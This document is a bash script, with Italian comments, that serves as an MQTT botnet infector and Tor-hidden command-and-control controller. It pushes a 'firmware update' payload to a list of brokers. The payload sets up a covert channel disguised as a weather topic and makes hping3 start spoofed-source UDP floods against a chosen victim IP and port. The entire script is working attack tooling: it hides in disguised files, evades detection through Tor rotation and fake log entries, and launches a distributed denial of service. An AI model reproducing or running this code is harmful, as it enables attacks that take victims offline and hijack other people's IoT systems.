#!/bin/bash
# MQTT Auto-Infector + C2 Controller - Tor Stealth


set -euo pipefail

VICTIM_IP=${1:? "Uso: $0 VICTIM_IP VICTIM_PORT DURATION"}
VICTIM_PORT=${2:-80}
DURATION=${3:-300}
BROKERS_FILE=${4:-brokers.txt}

# Auto-setup
command -v torsocks >/dev/null || sudo apt update && sudo apt -y install tor torsocks mosquitto-clients hping3
sudo systemctl restart tor 2>/dev/null || true

TOR_PROXY="socks5://127.0.0.1:9050"

tor_rotate() {
    timeout 5 echo -n 'AUTHENTICATE ""\nSIGNAL NEWNYM\nQUIT\n' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 2
}

# UNIVERSAL STEALTH SLAVE (auto-injected)
SLAVE_CODE='
#!/bin/bash
# Mosquitto Firmware Update v3.2.1 - System Process
set -euo pipefail

# Universal PID guard
PIDFILE="/var/run/mosquitto-firmware.pid"
[[ -f "$PIDFILE" ]] && exit 0
echo $$ > "$PIDFILE"
trap "rm -f \"$PIDFILE\"" EXIT

# Auto-detect broker
BROKER="${1:-127.0.0.1}"
PORT="${2:-1883}"

# Connectivity test
timeout 3 bash -c "exec 3<>/dev/tcp/$BROKER/$PORT" || exit 1

# Install hping3 if missing (universal)
command -v hping3 >/dev/null || {
    apt -qq update >/dev/null 2>&1 && apt -qq -y install hping3 >/dev/null 2>&1 || 
    yum -q install hping3 -y >/dev/null 2>&1 || true
}

# STEALTH C2 - Weather service masquerade
mosquitto_sub -h "$BROKER" -p "$PORT" -q -t "iot/weather" 2>/dev/null | while IFS= read -r cmd; do
    case "$cmd" in
        "FLOOD:"*)
            TARGET=$(echo "$cmd" | sed "s/FLOOD://")
            nohup hping3 --udp --flood --rand-source "$TARGET" >/dev/null 2>&1 &
            echo "Firmware update: network test $TARGET" >> /var/log/mosquitto.log 2>/dev/null || true
            ;;
        "STOP:"*)
            pkill -f hping3 2>/dev/null || true
            ;;
    esac
done &

wait
'

FLOOD_PAYLOAD="FLOOD:$VICTIM_IP:$VICTIM_PORT"

# 🎯 MAIN INFECTOR
echo "🔬 MQTT Auto-Infector → $VICTIM_IP:$VICTIM_PORT ($DURATION)s"
echo "📡 Target brokers: $(wc -l < "$BROKERS_FILE")"

infected=0 total=0
while IFS=':' read -r host port; do
    [[ -z "$host" || "$host" =~ ^# ]] && continue
    ((total++))
    port=${port:-1883}
    
    # Tor rotation ogni 3
    [[ $((infected % 3)) -eq 0 ]] && tor_rotate
    
    echo "💉 [$infected/$total] Infecting $host:$port"
    
    # STEP 1: INJECT SLAVE (system firmware update)
    if torsocks timeout 8 mosquitto_pub -h "$host" -p "$port" \
        -t "mosquitto/firmware" -m "$SLAVE_CODE" >/dev/null 2>&1; then
        ((infected++))
        echo "   ✅ Slave deployed"
    else
        echo "   ❌ Failed"
    fi
    
    sleep 0.2
done < "$BROKERS_FILE"

echo "✅ $infected/$total brokers INFETTATI"

# Wait propagation
echo "⏳ Subscribers executing (10s)..."
sleep 10

# STEP 2: TRIGGER FLOOD COMMAND
echo "🚀 Launching UDP flood..."
triggered=0
while IFS=':' read -r host port; do
    [[ -z "$host" || "$host" =~ ^# ]] && continue
    port=${port:-1883}
    
    [[ $((triggered % 3)) -eq 0 ]] && tor_rotate
    
    if torsocks timeout 5 mosquitto_pub -h "$host" -p "$port" \
        -t "iot/weather" -m "$FLOOD_PAYLOAD" >/dev/null 2>&1; then
        ((triggered++))
    fi
    
    sleep 0.15
done < "$BROKERS_FILE"

echo "🎉 BOTNET ATTIVA! $triggered triggers inviati"
echo "📊 Victim monitor: sudo tcpdump -i any udp and port $VICTIM_PORT -w flood.pcap"
echo "⏱️ Duration: $DURATION seconds"
